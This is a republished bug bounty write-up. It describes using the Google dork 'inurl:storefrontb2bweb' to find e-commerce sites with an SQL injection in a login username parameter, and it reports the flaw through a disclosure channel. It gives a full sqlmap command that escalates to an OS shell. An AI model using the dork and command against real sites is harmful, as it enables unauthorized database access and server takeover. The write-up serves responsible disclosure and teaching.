# :game_die: From SQL Injection to Hall Of Fame

> **Original Source:** [From SQL Injection to Hall Of Fame](https://infosecwriteups.com/from-sql-injection-to-hall-of-fame-96a08c869acd)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# From SQL Injection to Hall Of Fame


*Photo by [luis gomes](https://www.pexels.com/@luis-gomes-166706?utm_content=attributionCopyText&utm_medium=referral&utm_source=pexels) from [Pexels](https://www.pexels.com/photo/blur-close-up-code-computer-546819/?utm_content=attributionCopyText&utm_medium=referral&utm_source=pexels)*


Google Dorking seems an often under-appreciated technique in a bug bounty hunter’s arsenal when assessing a target web application for vulnerabilities. A Google dork query, sometimes just referred to as a dork, is a search string that uses advanced [search operators](https://whatis.techtarget.com/definition/search-operator) to find information that is not readily available on a website.


Google Dorking, also known as [Google hacking](https://searchsecurity.techtarget.com/definition/Google-hacking), can return information that is difficult to locate through simple search queries. That description includes information that is not intended for public viewing but that has not been adequately protected. Reference here [https://whatis.techtarget.com/definition/Google-dork-query](https://whatis.techtarget.com/definition/Google-dork-query)


I recently came across an interesting google dork `inurl:storefrontb2bweb`that enables us to scan for e-commerce websites that are vulnerable to SQL Injection. This was originally discovered by a bug hunter going by the name ratboy. Typing this query in Google will return 4 pages of results. Unfortunately, most of the website owners have no vulnerability disclosure in place and efforts to contact them via other channels proved futile.


## Get Mase289’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


One website had a vulnerability disclosure channel which I found through running a search on google “Company name vulnerability disclosure”. The vulnerable parameter is the username parameter which throws a SQL error when injected with a single or double quote.


*The SQL error message used to verify the vulnerability*


Exploiting this SQL Injection bug is trivial with [SQLMAP](http://sqlmap.org/) via the following command.


`python sqlmap.py -u"http://localhost/storefrontB2BWEB/login.do?setup_principal=true&action=prepare_forgot&login=true&usr_name=foo"
-p usr_name --dbms=mssql --level=5 --risk=3
--tamper=between,space2comment -o --random-agent --parse-errors
--os-shell --technique=ES`

### Fix


Proper user input escaping.


Reporting this vulnerability to the affected company earned me a place in their hall of fame. It is my hope that all of the companies affected shall take the necessary steps to resolve the issue and more importantly consider having avenues in place where such issues can be reported responsibly for timely resolution.

---

*Originally published on [Medium](https://infosecwriteups.com/from-sql-injection-to-hall-of-fame-96a08c869acd). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
